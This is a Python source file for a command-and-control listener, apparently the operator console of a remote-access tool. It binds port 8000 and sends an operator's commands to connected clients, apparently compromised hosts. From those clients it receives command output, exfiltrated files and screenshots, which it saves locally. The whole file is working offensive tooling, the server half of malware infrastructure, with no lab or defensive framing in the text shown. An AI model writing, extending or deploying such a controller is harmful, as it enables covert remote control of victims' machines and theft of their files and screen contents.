#!/usr/bin/env python3
"""
Feature-rich C2 listener.
Supports command execution, file download, and screenshot capture.
"""

import datetime
import socket
import struct
import sys
from pathlib import Path

HOST: str = ""
PORT: int = 8000
BUFFER: int = 65536

# Protocol tags
CMD_UPLOAD = b"\x01"
CMD_SCREENSHOT = b"\x02"
CMD_DONE = b"\x03"
CMD_EXIT = b"\x04"
CMD_OUTPUT = b"\x05"


def send_msg(sock: socket.socket, data: bytes) -> None:
    """Send a length-prefixed message."""
    sock.sendall(struct.pack(">I", len(data)) + data)


def recv_msg(sock: socket.socket) -> bytes:
    """Receive a length-prefixed message."""
    raw_len = _recv_exactly(sock, 4)
    if not raw_len:
        raise ConnectionError("Connection closed")
    msg_len = struct.unpack(">I", raw_len)[0]
    return _recv_exactly(sock, msg_len)


def _recv_exactly(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed mid-receive")
        buf += chunk
    return buf


def recv_file(client: socket.socket, filename: str) -> None:
    """Receive a file from the client and save it locally."""
    data = recv_msg(client)
    out_path = Path(filename).name  # Strip any path traversal
    Path(out_path).write_bytes(data)
    print(f"\n[+] File saved: {out_path} ({len(data)} bytes)")


def recv_screenshot(client: socket.socket) -> None:
    """Receive a screenshot from the client and save it."""
    data = recv_msg(client)
    timestamp = datetime.datetime.now().strftime("%H-%M-%S")
    out_path = Path(f"screenshot_{timestamp}.png")
    out_path.write_bytes(data)
    print(f"\n[+] Screenshot saved: {out_path} ({len(data)} bytes)")


def session(client: socket.socket, addr: tuple[str, int]) -> None:
    print(f"[+] Session opened: {addr}")
    try:
        while True:
            try:
                command = input("arm0red> ").strip()
            except EOFError:
                break

            if not command:
                continue

            send_msg(client, command.encode())

            if command in ("quit", "exit"):
                break

            # Read responses until CMD_DONE or CMD_EXIT
            while True:
                tag = recv_msg(client)

                if tag == CMD_EXIT:
                    print("[*] Client disconnected.")
                    return
                elif tag == CMD_DONE:
                    break
                elif tag == CMD_UPLOAD:
                    filename = recv_msg(client).decode()
                    recv_file(client, filename)
                elif tag == CMD_SCREENSHOT:
                    recv_screenshot(client)
                elif tag == CMD_OUTPUT:
                    output = recv_msg(client)
                    print(output.decode("utf-8", errors="replace"), end="")
                else:
                    # Unknown tag — print raw
                    print(tag.decode("utf-8", errors="replace"), end="")

    except (ConnectionError, OSError) as e:
        print(f"\n[!] Connection error: {e}")
    finally:
        print(f"[-] Session closed: {addr}")


def main() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[*] Listening on 0.0.0.0:{PORT}")
        try:
            while True:
                client, addr = s.accept()
                with client:
                    session(client, addr)
        except KeyboardInterrupt:
            print("\n[!] Shutting down.")
            sys.exit(0)


if __name__ == "__main__":
    main()
